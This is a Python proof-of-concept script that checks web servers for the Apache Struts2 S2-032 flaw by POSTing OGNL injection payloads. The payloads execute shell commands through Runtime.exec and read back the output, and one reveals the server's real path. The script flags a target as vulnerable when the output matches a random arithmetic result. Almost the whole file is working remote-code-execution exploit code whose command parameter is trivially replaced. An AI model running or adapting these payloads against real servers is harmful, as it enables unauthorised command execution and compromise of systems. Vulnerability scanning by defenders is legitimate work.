import warnings
import requests
import random

warnings.filterwarnings("ignore")


def poc(url, **kwargs):
    if kwargs.get('ip'):
        url = 'http://' + kwargs.get('ip') + ':' + kwargs.get('port')
    else:
        url = url
    timeout = 10
    proxies = {'http': '127.0.0.1:9999'}
    ran_a = random.randint(10000000, 20000000)
    ran_b = random.randint(1000000, 2000000)
    ran_check = ran_a - ran_b
    lin = 'expr' + ' ' + str(ran_a) + ' - ' + str(ran_b)
    check = [ran_check, '无法初始化设备 PRN', '??????? PRN', 'Struts2-vuln-Goop1116',
             'Unable to initialize device PRN']
    poc_goop = [
        r"method%3a%23_memberAccess%3d@ognl.OgnlContext+@DEFAULT_MEMBER_ACCESS%2c%23kxlzx%3d+@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2c%23kxlzx.println%28" + str(
            ran_a) + '-' + str(ran_b) + "%29%2c%23kxlzx.close",
        r"method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=print+goop&pp=\\A&ppp=%20&encoding=UTF-8",
        r"method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=" + lin + r"&pp=\\A&ppp=%20&encoding=UTF-8",
        r"method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),%23w.print(1116),1?%23xx:%23request.toString&pp=Struts2-vuln-Goop&encoding=UTF-8"]
    headers = {
        "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        for test in poc_goop:
            req = requests.post(url, data=test, headers=headers, timeout=timeout, verify=False)
            result = "目标存在 Struts2-032, check url: %s" % url
            for c in check:
                if str(c) in req.text:
                    # print(str(c))
                    return result
    except:
        pass

# test_url = 'http://127.0.0.1:8080/struts2-showcase/jsf/index.action'
if __name__ == '__main__':
    a = poc("http://192.168.106.130:8032/memoshow.action?id=4")
    print(a)